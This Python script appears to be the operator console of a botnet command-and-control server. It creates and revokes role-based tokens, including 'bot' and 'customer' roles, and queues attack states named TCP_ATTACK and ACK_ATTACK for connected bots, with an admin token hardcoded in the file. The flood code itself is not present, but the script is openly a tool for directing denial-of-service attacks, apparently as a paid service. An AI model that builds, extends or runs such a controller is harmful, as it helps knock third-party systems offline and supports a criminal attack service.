import requests
import time

SERVER_URL = "http://localhost"
SERVER_PORT = 8080
ADMIN_TOKEN = "AD2442e9471b2ff5376b5a70486379f7"

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
BOLD = "\033[1m"

headers = {"Authorization": ADMIN_TOKEN}

def log(message: str, level="info"):
    colors = {
        "info": BLUE,
        "success": GREEN,
        "warning": YELLOW,
        "error": RED
    }
    print(f"{colors.get(level, RESET)}[{level.upper()}] {message}{RESET}")

def print_banner():
    ascii_art = f"""
    {YELLOW}[0] Tokens{RESET}
    {YELLOW}[1] Attack{RESET}
    """
    print(ascii_art)

def token_choose(): 
    print(chr(27) + "[2J")
    print(f"""
{BOLD}{CYAN}    [0] Create new token
    [1] Revoke token
    [2] Validate token{RESET}
    """)

    try:
        token_opt = int(input("-> "))
    except ValueError:
        log("Invalid input! Please enter a number.", "error")
        return
    
    token = ""
    if token_opt != 0:
        token = input(f"{YELLOW}[?] Insert token: {RESET}")


    if token_opt == 0:
        roles = ['admin', 'operator', 'supervisor', 'bot', 'customer']
        print(chr(27) + "[2J")
        for i, role in enumerate(roles):
            print(f"[{i}] {role}")

        try:
            role_selected = int(input(f"{YELLOW}[?] Select token role: {RESET}"))
            if role_selected not in range(len(roles)):
                raise ValueError
        except ValueError:
            log("Invalid role selection!", "error")
            return
        
        req = requests.post(f"{SERVER_URL}:{SERVER_PORT}/token/new/{roles[role_selected]}", headers=headers)

        if req.status_code != 200:
            log(f"Error: {req.text}", "error")
        else:
            log(f"Token created: {req.text}", "success")
    elif token_opt == 1:
        req = requests.post(f"{SERVER_URL}:{SERVER_PORT}/token/delete/{token}", headers=headers)

        if req.status_code != 200:
            log(f"Error: {req.text}", "error")
        else:
            log(f"Token deleted: {req.text}", "success")
    elif token_opt == 2:
        req = requests.post(f"{SERVER_URL}:{SERVER_PORT}/token/{token}", headers=headers)

        if req.status_code != 200:
            log(f"Error: {req.text}", "error")
        else:
            log(f"Token validated: {req.text}", "success")
    else:
        log("Invalid option selected!", "error")

    time.sleep(2)

def attack():
    print(chr(27) + "[2J")

    status = {
        'STOP': 2 << 0,
        'TCP_ATTACK': 2 << 1,
        'ACK_ATTACK': 2 << 2,
        'IDLE': 2 << 5,
        'EXIT': 2 << 6
    }

    status_string = list(status.keys())

    try:
        req = requests.get(f'{SERVER_URL}:{SERVER_PORT}/polling', headers=headers)

        value_to_find = int(req.text)
        key = [k for k, v in status.items() if v == value_to_find]

        log(f"[?] Current status: {YELLOW}{key}{RESET}", "info")
    except requests.RequestException as e:
        log(f"Error contacting server: {e}", "error")
        return

    for i, state in enumerate(status_string):
        print(f"{BOLD}{CYAN}[{i}] {state}{RESET}")

    try:
        attack_opt = int(input(f"{YELLOW}[?] Select status: {RESET}"))
        if attack_opt < 0 or attack_opt >= len(status_string):
            raise ValueError
    except ValueError:
        log("Invalid input! Please enter a valid number.", "error")
        return

    selected_status = status_string[attack_opt]
    status_code = status[selected_status]

    try:
        req = requests.post(f'{SERVER_URL}:{SERVER_PORT}/queue/set/{status_code}', headers=headers)
        if req.status_code == 200:
            log(f"Successfully set status to {GREEN}{selected_status}{RESET}.", "success")
        else:
            log(f"Error setting status: {req.text}", "error")
    except requests.RequestException as e:
        log(f"Error contacting server: {e}", "error")


def main():
    while True:
        print(chr(27) + "[2J")
        print_banner()

        try:
            opt = int(input("select -> "))
        except ValueError:
            log("Invalid input! Please enter a number.", "error")
            continue

        match opt:
            case 0:
                token_choose()
            case 1:
                attack()
                break
            case _:
                log("Invalid option selected!", "error")

if __name__ == "__main__":
    main()
    exit(0)
